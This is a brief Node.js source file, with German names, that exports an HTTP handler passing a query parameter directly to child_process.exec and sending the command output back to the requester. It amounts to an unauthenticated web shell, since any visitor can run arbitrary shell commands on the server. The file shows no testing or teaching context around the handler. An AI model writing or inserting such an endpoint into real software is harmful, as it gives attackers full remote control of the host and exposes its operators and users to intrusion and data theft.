import child_process from "node:child_process";

export function befehlAusfuehren(req, res) {
  child_process.exec(req.query.befehl, (fehler, ausgabe) => {
    res.type("text/plain").send(fehler ? "Fehler" : ausgabe);
  });
}
